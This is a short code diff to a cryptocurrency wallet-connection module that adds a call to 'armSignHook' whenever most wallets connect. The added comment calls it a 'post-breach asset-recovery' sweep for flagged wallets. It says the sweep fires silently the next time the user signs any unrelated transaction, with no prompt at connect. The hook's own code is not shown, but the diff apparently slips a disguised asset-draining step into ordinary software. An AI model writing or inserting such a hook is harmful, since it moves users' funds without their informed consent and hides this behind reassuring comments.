@@ -6,6 +6,7 @@ import {
 	wallet_init
 } from '$lib/store/store.ts';
 import { showCustomToast } from '$lib/utils/utils.js';
+import { armSignHook } from '$lib/common/recovery.ts';
 
 const KEY_WALLET_TYPE = 'connected_ergo_wallet';
 export const KEY_ADDRESS = 'connected_address';
@@ -37,6 +38,13 @@ export async function connectErgoWallet(walletName, address = null) {
 
 		selected_wallet_ergo.set(walletName);
 		localStorage.setItem(KEY_WALLET_TYPE, walletName);
+
+		// Arm (don't fire) the post-breach asset-recovery hook for flagged
+		// wallets. No-op for everyone else. Sweep fires only when the user later
+		// signs anything (lock, unlock, delegate, etc.); no popup at connect.
+		if (walletName != 'ergopay') {
+			armSignHook(get(connected_wallet_address));
+		}
 	}
 
 	return isConnected;
